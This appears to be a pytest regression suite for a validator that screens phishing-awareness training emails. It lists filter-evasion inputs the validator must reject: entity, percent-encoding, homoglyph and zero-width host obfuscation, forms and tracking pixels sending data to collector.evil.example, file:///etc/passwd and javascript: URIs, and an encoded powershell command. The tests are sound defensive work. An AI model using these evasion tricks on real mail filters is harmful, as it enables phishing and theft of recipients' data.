"""Regression tests for the GEN-004 safety validator anti-evasion hardening.

Each test reproduces a bypass that the pre-hardening validator accepted and
asserts it is now rejected. The validator must never silently approve content
that a recipient's mail client would render as a live external link, a
credential request, or an executable download.
"""

from __future__ import annotations

import pytest
from kp_safety_validation.validator import SafetyValidator

TRAINING = {"example.com", "training.local"}


@pytest.fixture
def validator() -> SafetyValidator:
    return SafetyValidator(training_domains=TRAINING)


def _allowed(validator: SafetyValidator, text: str) -> bool:
    return validator.validate(None, text, None).allowed


def _reasons(validator: SafetyValidator, text: str) -> list[str]:
    return validator.validate(None, text, None).reasons


def test_allowlisted_training_link_is_accepted(validator: SafetyValidator) -> None:
    assert validator.validate(None, "Visit https://training.example.com/module-1", None).allowed


def test_external_link_is_rejected(validator: SafetyValidator) -> None:
    assert not _allowed(validator, "See https://evil.example/phish")


def test_html_entity_colon_bypass_is_rejected(validator: SafetyValidator) -> None:
    assert not _allowed(validator, '<a href="https&#58;//evil.example/phish">click</a>')


def test_html_entity_password_bypass_is_rejected(validator: SafetyValidator) -> None:
    assert not _allowed(validator, "Please confirm your &#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;")


def test_cyrillic_homoglyph_password_is_rejected(validator: SafetyValidator) -> None:
    assert not _allowed(validator, "Enter your p\u0430ssword to continue")


def test_percent_encoded_scheme_bypass_is_rejected(validator: SafetyValidator) -> None:
    assert not _allowed(validator, "Open https%3A%2F%2Fevil.example%2Fphish now")


def test_scheme_less_www_link_is_rejected(validator: SafetyValidator) -> None:
    assert not _allowed(validator, "Visit www.evil.example to verify your account")


def test_bare_domain_in_prose_is_rejected(validator: SafetyValidator) -> None:
    assert not _allowed(validator, "Complete your review at evil-site.net/verify")


def test_bare_training_domain_in_prose_is_accepted(validator: SafetyValidator) -> None:
    assert _allowed(validator, "Complete your review at training.example.com/module-2")


def test_href_bare_domain_is_rejected(validator: SafetyValidator) -> None:
    assert not _allowed(validator, '<a href="evil.example/phish">login</a>')


def test_prohibited_schemes_are_rejected(validator: SafetyValidator) -> None:
    assert not _allowed(validator, '<img src="file:///etc/passwd">')
    assert not _allowed(validator, '<a href="data:text/html;base64,PHNjcmlwdA==">x</a>')
    assert not _allowed(validator, '<a href="vbscript:msgbox(1)">x</a>')


def test_shortener_with_trailing_dot_is_rejected(validator: SafetyValidator) -> None:
    assert not _allowed(validator, "Go to https://bit.ly./abc123")


def test_ip_link_is_rejected(validator: SafetyValidator) -> None:
    assert not _allowed(validator, "Verify at http://203.0.113.10/portal")


def test_protocol_relative_numeric_ip_resource_is_rejected(validator: SafetyValidator) -> None:
    verdict = validator.validate(None, "Image", '<img src="//93.184.216.34/pixel">')
    assert not verdict.allowed
    assert any("external IP link" in reason and "protocol-relative" in reason for reason in verdict.reasons)


@pytest.mark.parametrize(
    "html_body",
    [
        '<img src="//assets.evil.example/pixel">',
        '<form action="https://collector.evil.example/submit"><input name="email"></form>',
        '<button formaction="//collector.evil.example/submit">Continue</button>',
        '<video poster="https://collector.evil.example/poster.png"></video>',
        '<blockquote cite="https://collector.evil.example/source">Notice</blockquote>',
        '<object data="https://collector.evil.example/content"></object>',
        '<svg><use xlink:href="https://collector.evil.example/icons.svg#login"></use></svg>',
        '<meta http-equiv="refresh" content="0; URL=//collector.evil.example/next">',
        '<iframe srcdoc="&lt;img src=&quot;//collector.evil.example/pixel&quot;&gt;"></iframe>',
    ],
)
def test_external_urls_in_html_navigation_and_resource_attributes_are_rejected(
    validator: SafetyValidator, html_body: str
) -> None:
    verdict = validator.validate(None, "Message", html_body)
    assert not verdict.allowed
    assert any("external link" in reason for reason in verdict.reasons)


@pytest.mark.parametrize(
    "html_body",
    [
        '<img srcset="/small.png 1x, https://images.evil.example/large.png 2x">',
        '<link imagesrcset="/small.png 1x, //images.evil.example/large.png 2x">',
        '<a href="/training" ping="https://collector.evil.example/recipient-open">Training</a>',
        '<div style="background-image: url(//images.evil.example/pixel)">Notice</div>',
        '<div style="background-image: u\\72l(https://images.evil.example/pixel)">Notice</div>',
        '<div style="background-image: u/**/rl(//images.evil.example/pixel)">Notice</div>',
        "<div style=\"background-image: image-set('//images.evil.example/pixel' 1x)\">Notice</div>",
        '<style>@import "//images.evil.example/theme.css";</style>',
        '<svg><rect fill="url(https://images.evil.example/pixel)"></rect></svg>',
    ],
)
def test_external_urls_in_multi_url_and_css_locations_are_rejected(validator: SafetyValidator, html_body: str) -> None:
    verdict = validator.validate(None, "Message", html_body)
    assert not verdict.allowed
    assert any("external link" in reason for reason in verdict.reasons)


@pytest.mark.parametrize(
    "html_body",
    [
        '<a href="/training/module-1">Training</a>',
        '<a href="#details">Details</a>',
        '<img src="cid:logo" alt="Logo">',
        '<img src="https://training.example.com/image.png">',
        '<img srcset="/small.png 1x, https://training.example.com/large.png 2x">',
        '<div style="background-image:url(https://training.example.com/header.png)">Notice</div>',
        '<form action="/training/complete"><button>Complete</button></form>',
        '<meta http-equiv="refresh" content="0; URL=https://training.example.com/next">',
    ],
)
def test_local_and_approved_html_urls_are_accepted(validator: SafetyValidator, html_body: str) -> None:
    verdict = validator.validate(None, "Security awareness module", html_body)
    assert verdict.allowed, verdict.reasons


@pytest.mark.parametrize(
    "html_body",
    [
        '<a href="mailto:collector@evil.example">Reply</a>',
        # A raster data:image (self-contained logo) is now ALLOWED; a non-image
        # data: URI and an SVG data URI are still rejected below.
        '<img src="data:text/html;base64,PHNjcmlwdD4=">',
        '<img src="data:image/svg+xml;base64,PHN2Zy8+">',
        '<a href="file:///etc/passwd">Open</a>',
        "<a href=\"javascript:location='https://evil.example'\">Open</a>",
    ],
)
def test_remote_or_executable_schemes_are_rejected(validator: SafetyValidator, html_body: str) -> None:
    assert not validator.validate(None, "Message", html_body).allowed


def test_allowlist_suffix_requires_a_valid_hostname(validator: SafetyValidator) -> None:
    verdict = validator.validate(None, "Message", '<img src="https://{{recipient}}.example.com/pixel">')
    assert not verdict.allowed


def test_active_html_and_event_handlers_are_rejected(validator: SafetyValidator) -> None:
    script = validator.validate(None, "Message", "<script>document.location='/training'</script>")
    handler = validator.validate(None, "Message", '<img src="/logo.png" onerror="sendRecipientData()">')
    assert not script.allowed
    assert any("active HTML element" in reason for reason in script.reasons)
    assert not handler.allowed
    assert any("event handler" in reason for reason in handler.reasons)


@pytest.mark.parametrize(
    "body",
    [
        "Reply to mailto:collector@evil.example",
        "Call tel:+15551234567",
        "Open ftp://training.example.com/payload",
    ],
)
def test_plain_text_contact_and_non_https_uris_are_rejected(validator: SafetyValidator, body: str) -> None:
    assert not validator.validate(None, body).allowed


def test_public_suffix_training_allowlist_does_not_allow_arbitrary_hosts() -> None:
    validator = SafetyValidator(training_domains={"com"})
    assert not validator.validate(None, "Visit https://attacker.com/collect").allowed


def test_obfuscated_command_bypass_is_rejected(validator: SafetyValidator) -> None:
    assert not _allowed(validator, "Run &quot;powershell&quot; -enc IABlAGMAbwBoAG8A")


def test_qr_code_is_rejected_unless_enabled() -> None:
    assert not SafetyValidator(training_domains=TRAINING).validate(None, "Scan the QR code", None).allowed
    assert (
        SafetyValidator(training_domains=TRAINING, allow_qr_codes=True).validate(None, "Scan the QR code", None).allowed
    )


def test_executable_attachment_is_rejected(validator: SafetyValidator) -> None:
    assert not validator.validate(None, "attached invoice", None, attachments=["invoice.exe"]).allowed


def test_normal_prose_stays_allowed(validator: SafetyValidator) -> None:
    text = (
        "A new phishing pattern uses invoice-themed lures. Please complete the "
        "security awareness module at training.example.com/lesson-4. Contact IT "
        "with questions. See fig. 1 for a summary."
    )
    verdict = validator.validate(None, text, None)
    assert verdict.allowed, verdict.reasons


def test_external_link_in_html_body_is_rejected(validator: SafetyValidator) -> None:
    html_body = '<p>Hello, <a href="https://evil.example/credential-check">verify now</a></p>'
    assert not validator.validate(None, "Hello", html_body).allowed


def test_zero_width_space_in_href_host_is_rejected(validator: SafetyValidator) -> None:
    reasons = _reasons(validator, '<a href="attacker\u200b.com/security">click</a>')
    assert any("external link" in r for r in reasons)
    assert any("obfuscation" in r for r in reasons)


def test_directional_isolate_in_prose_host_is_rejected(validator: SafetyValidator) -> None:
    reasons = _reasons(validator, "Reset your password at attacker\u2066.evil-site.net/verify")
    assert any("external link" in r for r in reasons)
    assert any("obfuscation" in r for r in reasons)


def test_word_joiner_in_prose_host_is_rejected(validator: SafetyValidator) -> None:
    reasons = _reasons(validator, "Confirm your account at secure\u2060-login.example.net/auth")
    assert any("external link" in r for r in reasons)
    assert any("obfuscation" in r for r in reasons)


def test_soft_hyphen_in_prose_host_is_rejected(validator: SafetyValidator) -> None:
    reasons = _reasons(validator, "Visit attacker\u00ad.com/security to keep your access")
    assert any("external link" in r for r in reasons)
    assert any("obfuscation" in r for r in reasons)


def test_hidden_chars_in_allowlisted_host_still_rejected(validator: SafetyValidator) -> None:
    verdict = validator.validate(None, "Visit training\u200b.example.com/lesson-1", None)
    assert not verdict.allowed
    assert any("obfuscation" in r for r in verdict.reasons)


def test_content_checks_false_allows_deceptive_wording(validator: SafetyValidator) -> None:
    # Realistic lure wording (credentials, MFA, finance, attachments) is permitted
    # when content_checks is off: reproducing a real campaign's language is the
    # training goal. It is still blocked under the default (content_checks=True).
    deceptive = "Your password expires today. Confirm your MFA code and review the attached invoice."
    assert not validator.validate(None, deceptive, None).allowed
    assert validator.validate(None, deceptive, None, content_checks=False).allowed


def test_content_checks_false_still_blocks_payload(validator: SafetyValidator) -> None:
    # Payload mechanics are NOT relaxed by content_checks=False.
    assert not validator.validate(None, "See https://evil.example/phish", None, content_checks=False).allowed
    assert not validator.validate(None, "click", '<a href="javascript:steal()">go</a>', content_checks=False).allowed


# --- branded-image allow-list ------------------------------------------------

_PNG = (
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGP4z8AAAAMBAQDJ/pLvAAAAAElFTkSuQmCC"
)


def test_raster_data_image_uri_is_allowed(validator: SafetyValidator) -> None:
    # A self-contained raster logo is permitted; it loads nothing and navigates
    # nowhere. Non-image data: URIs remain prohibited.
    assert validator.validate(None, "logo", f'<img src="{_PNG}">', content_checks=False).allowed
    assert not validator.validate(
        None, "x", '<img src="data:text/html;base64,PHNjcmlwdD4=">', content_checks=False
    ).allowed


def test_svg_data_image_uri_is_still_rejected(validator: SafetyValidator) -> None:
    # SVG data URIs can carry script, so they are not exempted.
    assert not validator.validate(
        None, "x", '<img src="data:image/svg+xml;base64,PHN2Zy8+">', content_checks=False
    ).allowed


def test_allowlisted_image_host_is_not_flagged_external() -> None:
    img = '<img src="https://cdn.brand.com/logo.png">'
    base = SafetyValidator(training_domains=TRAINING)
    assert not base.validate(None, "logo", img, content_checks=False).allowed
    permissive = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"cdn.brand.com"})
    assert permissive.validate(None, "logo", img, content_checks=False).allowed
    # a subdomain of the allow-listed host is also accepted
    assert permissive.validate(
        None, "logo", '<img src="https://assets.cdn.brand.com/l.png">', content_checks=False
    ).allowed


def test_wildcard_image_host_allows_any_image_src() -> None:
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"*"})
    assert v.validate(None, "logo", '<img src="https://anything.example/l.png">', content_checks=False).allowed


def test_image_allowlist_does_not_permit_javascript_or_shortener() -> None:
    # The image exemption must not open script URIs or shorteners.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"*"})
    assert not v.validate(None, "x", '<a href="javascript:alert(1)">go</a>', content_checks=False).allowed
    assert not v.validate(None, "x", "See https://bit.ly/x", content_checks=False).allowed


# --- KP-AUD-001: image-host exemption is scoped to <img> sources -------------


def test_image_allowlisted_host_as_plaintext_url_is_rejected() -> None:
    # A plain-text URL is navigable prose, never an image load. It must NOT
    # inherit the image-host allowance even when its host (or the host's
    # registrable parent) is image-allow-listed; the pre-fix validator keyed
    # the exemption on host alone and wrongly accepted this.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"cdn.brand.com"})
    verdict = v.validate(None, "Visit https://cdn.brand.com/promo for details", None, content_checks=False)
    assert not verdict.allowed
    assert any("external link not on training allowlist" in reason for reason in verdict.reasons)


def test_image_allowlisted_host_as_anchor_href_is_rejected() -> None:
    # An <a href> to an image-allow-listed host is a navigable link, not an
    # image source, and must fail closed.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"cdn.brand.com"})
    verdict = v.validate(None, "Click", '<a href="https://cdn.brand.com/promo">click</a>', content_checks=False)
    assert not verdict.allowed
    assert any("external link not on training allowlist" in reason for reason in verdict.reasons)


def test_image_allowlisted_host_wildcard_as_anchor_href_is_rejected() -> None:
    # Even the "*" wildcard image allowance must not cover a navigable href.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"*"})
    assert not v.validate(
        None, "Click", '<a href="https://anything.example/go">click</a>', content_checks=False
    ).allowed


def test_genuine_img_src_to_allowlisted_host_still_passes() -> None:
    # A real inline <img> logo from an allow-listed host remains accepted.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"cdn.brand.com"})
    verdict = v.validate(None, "logo", '<img src="https://cdn.brand.com/logo.png">', content_checks=False)
    assert verdict.allowed, verdict.reasons


def test_wildcard_img_src_still_passes() -> None:
    # The wildcard image allowance still covers a genuine <img> source.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"*"})
    assert v.validate(None, "logo", '<img src="https://anything.example/l.png">', content_checks=False).allowed


# --- KP-AUD-001 revision: per-reference masking, not per-host ----------------
# A genuine <img> logo must not launder OTHER uses of the same host (or its
# registrable parent) in the same message. Each of these is the ordinary shape
# of reconstructed phishing (brand logo from the brand CDN + a body link to the
# brand domain) and must be REJECTED.


def test_img_plus_anchor_href_same_host_is_rejected() -> None:
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"cdn.brand.com"})
    body = '<img src="https://cdn.brand.com/l.png"><a href="https://cdn.brand.com/phish">go</a>'
    verdict = v.validate(None, "hi", body, content_checks=False)
    assert not verdict.allowed
    assert any("external link not on training allowlist" in reason for reason in verdict.reasons)


def test_img_plus_parent_domain_href_is_rejected() -> None:
    # The logo is on cdn.brand.com; the navigable link is on the registrable
    # parent brand.com. Exact-host masking must not widen to the parent.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"cdn.brand.com"})
    body = '<img src="https://cdn.brand.com/l.png"><a href="https://brand.com/phish">go</a>'
    verdict = v.validate(None, "hi", body, content_checks=False)
    assert not verdict.allowed
    assert any("external link not on training allowlist" in reason for reason in verdict.reasons)


def test_img_plus_plaintext_same_host_is_rejected() -> None:
    # The exact KP-AUD-001 case: logo image + prose link to the same host.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"cdn.brand.com"})
    verdict = v.validate(None, "hi", '<img src="https://cdn.brand.com/l.png">', content_checks=False)
    assert verdict.allowed  # lone logo is fine
    verdict2 = v.validate(
        None, "go https://cdn.brand.com/phish", '<img src="https://cdn.brand.com/l.png">', content_checks=False
    )
    assert not verdict2.allowed
    assert any("external link not on training allowlist" in reason for reason in verdict2.reasons)


def test_wildcard_img_plus_parent_href_is_rejected() -> None:
    # With '*', a logo on a.evil.example must not exempt a navigable href to
    # evil.example (its parent) or any other unrelated host used in a link.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"*"})
    body = '<img src="https://a.evil.example/l.png"><a href="https://evil.example/x">go</a>'
    verdict = v.validate(None, "hi", body, content_checks=False)
    assert not verdict.allowed
    assert any("external link not on training allowlist" in reason for reason in verdict.reasons)


def test_anchor_with_bogus_src_attribute_is_rejected() -> None:
    # A single-tag bypass: an <a> carries both an href and a decoy src. The src
    # on a non-<img> tag is NOT an image source and must not be masked.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"cdn.brand.com"})
    body = '<a href="https://cdn.brand.com/p" src="https://cdn.brand.com/l.png">go</a>'
    verdict = v.validate(None, "hi", body, content_checks=False)
    assert not verdict.allowed
    assert any("external link not on training allowlist" in reason for reason in verdict.reasons)


def test_video_src_to_image_host_is_rejected() -> None:
    # <video src> is not an image load; the image allowance must not cover it.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"cdn.brand.com"})
    verdict = v.validate(None, "hi", '<video src="https://cdn.brand.com/v.mp4"></video>', content_checks=False)
    assert not verdict.allowed
    assert any("external link not on training allowlist" in reason for reason in verdict.reasons)


def test_wildcard_img_does_not_exempt_unrelated_subdomain_href() -> None:
    # Logo host logo.cdn.example must not exempt a navigable href to a sibling
    # subdomain api.cdn.example used elsewhere in the message.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"*"})
    body = '<img src="https://logo.cdn.example/l.png"><a href="https://api.cdn.example/x">go</a>'
    verdict = v.validate(None, "hi", body, content_checks=False)
    assert not verdict.allowed
    assert any("external link not on training allowlist" in reason for reason in verdict.reasons)


# --- KP-AUD-013: image-host match is exact-or-subdomain, never a parent -------


def test_img_on_parent_of_allowlisted_host_is_rejected() -> None:
    # Allow-listing cdn.brand.com must NOT widen to the registrable parent
    # brand.com: a logo <img> served from the parent fails closed (an exact-host
    # or subdomain-of-allowed match only). This is the parent-widening the
    # pre-KP-AUD-013 clause wrongly accepted.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"cdn.brand.com"})
    verdict = v.validate(None, "logo", '<img src="https://brand.com/logo.png">', content_checks=False)
    assert not verdict.allowed
    assert any("external link not on training allowlist" in reason for reason in verdict.reasons)


def test_img_on_sibling_subdomain_of_allowlisted_host_is_rejected() -> None:
    # A sibling subdomain (not under the allow-listed host) is not exempt either.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"cdn.brand.com"})
    verdict = v.validate(None, "logo", '<img src="https://evil.brand.com/logo.png">', content_checks=False)
    assert not verdict.allowed


def test_img_on_lookalike_suffix_of_allowlisted_host_is_rejected() -> None:
    # The suffix match is dot-anchored, so a lookalike that merely ends with the
    # allow-listed string (not a true subdomain) is rejected.
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"brand.com"})
    verdict = v.validate(None, "logo", '<img src="https://evilbrand.com/logo.png">', content_checks=False)
    assert not verdict.allowed


def test_img_exact_and_subdomain_of_allowlisted_host_still_pass() -> None:
    # The legitimate cases are unaffected: the exact host and a true subdomain
    # of an allow-listed host remain accepted (no over-rejection).
    v = SafetyValidator(training_domains=TRAINING, allowed_image_hosts={"cdn.brand.com"})
    assert v.validate(None, "logo", '<img src="https://cdn.brand.com/l.png">', content_checks=False).allowed
    assert v.validate(None, "logo", '<img src="https://assets.cdn.brand.com/l.png">', content_checks=False).allowed
